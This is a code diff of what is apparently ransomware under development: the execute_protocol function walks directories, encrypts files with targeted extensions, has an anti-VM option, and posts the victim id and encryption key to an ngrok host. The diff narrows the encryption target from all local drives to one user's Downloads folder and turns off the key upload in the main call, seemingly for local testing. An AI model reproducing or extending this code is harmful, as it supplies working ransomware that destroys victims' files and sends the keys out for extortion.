@@ -97,17 +97,18 @@ def execute_protocol(antivm=True, send_post=True, executable=True):
 
         local_drives = cm.get_local_drives()
 
-        cm.search_and_split(local_drives)
+        cm.search_and_split(r"C:\Users\Marqu\Downloads")
 
-        for ld in local_drives:
-            for root, dirs, files in os.walk(ld):
-                [dirs.remove(d) for d in list(dirs) if d in cm.PROTECTED_DIRS]
-                for fn in files:
-                    full_path = root + os.sep + fn
-                    ext = cm.get_file_extension(full_path)
-                    if ext in cm.TARGET_EXT and ext not in cm.EXCLUDED_EXT and fn != 'test.txt':
-                        cm.symmetric_encrypt_or_decrypt(full_path)
-                        print(full_path + ' -> [encrypted]')
+        #for ld in local_drives:
+        for root, dirs, files in os.walk(r"C:\Users\Marqu\Downloads"):
+            [dirs.remove(d) for d in list(dirs) if d in cm.PROTECTED_DIRS]
+            for fn in files:
+                full_path = root + os.sep + fn
+                ext = cm.get_file_extension(full_path)
+                if ext in cm.TARGET_EXT and ext not in cm.EXCLUDED_EXT and fn != 'test.txt':
+                    print(full_path + ' -> [encrypted]')
+                    cm.symmetric_encrypt_or_decrypt(full_path)
+                    #print(full_path + ' -> [encrypted]')
         
         if send_post:
             cm.send_post_request(url='http://22c26716a8d8.ngrok.io/', id=str(id), key=cm.key)
@@ -124,7 +125,7 @@ def execute_protocol(antivm=True, send_post=True, executable=True):
 
 
 if __name__ == '__main__':
-    execute_protocol(antivm=False, executable=False)
+    execute_protocol(antivm=False, send_post=False, executable=False)
 
 """
 from CryptoManager import CryptoManager
